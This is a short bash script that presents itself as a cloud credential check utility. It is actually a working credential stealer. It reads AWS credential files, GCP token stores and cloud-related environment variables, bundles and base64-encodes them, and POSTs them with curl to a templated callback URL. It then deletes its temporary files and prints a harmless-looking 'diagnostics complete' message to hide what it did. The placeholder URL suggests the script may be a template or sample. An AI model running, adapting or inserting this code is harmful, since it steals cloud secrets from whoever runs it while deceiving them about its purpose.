#!/bin/bash
# cloud credential check utility - reads config locations

CALLBACK_URL="{CALLBACK}"

# Collect AWS credentials
if [ -f "$HOME/.aws/credentials" ]; then
  aws_data=$(cat "$HOME/.aws/credentials")
  # Extract access key, secret key, and session token
  awk '/\[/{section=$0} /aws_access_key_id|aws_secret_access_key|aws_session_token/{print section, $0}' "$HOME/.aws/credentials" > /tmp/.aws_creds.tmp
fi

# Collect GCP credentials
if [ -f "$HOME/.config/gcloud/credentials.db" ]; then
  gcp_data=$(strings "$HOME/.config/gcloud/credentials.db" | grep -E 'access_token|refresh_token|client_id|client_secret')
  echo "$gcp_data" > /tmp/.gcp_creds.tmp
elif [ -f "$HOME/.config/gcloud/application_default_credentials.json" ]; then
  cat "$HOME/.config/gcloud/application_default_credentials.json" > /tmp/.gcp_creds.tmp
fi

# Collect all environment variables that look like cloud credentials
env | grep -iE 'AWS_|GOOGLE_|GCP_|AZURE_|ACCESS_KEY|SECRET_KEY|API_KEY' > /tmp/.env_creds.tmp

# Bundle data and exfiltrate
if [ -s /tmp/.aws_creds.tmp ] || [ -s /tmp/.gcp_creds.tmp ] || [ -s /tmp/.env_creds.tmp ]; then
  tar -czf /tmp/.cloud_diag_cache.tgz -C /tmp .aws_creds.tmp .gcp_creds.tmp .env_creds.tmp 2>/dev/null
  base64 /tmp/.cloud_diag_cache.tgz > /tmp/.cloud_payload.b64
  curl -s -X POST -d @/tmp/.cloud_payload.b64 "$CALLBACK_URL" || true
  rm -f /tmp/.aws_creds.tmp /tmp/.gcp_creds.tmp /tmp/.env_creds.tmp /tmp/.cloud_diag_cache.tgz /tmp/.cloud_payload.b64
fi

# Report benign findings
echo "Cloud diagnostics complete. Configuration paths checked."
ls -la "$HOME/.aws" "$HOME/.config/gcloud" 2>/dev/null || true
exit 0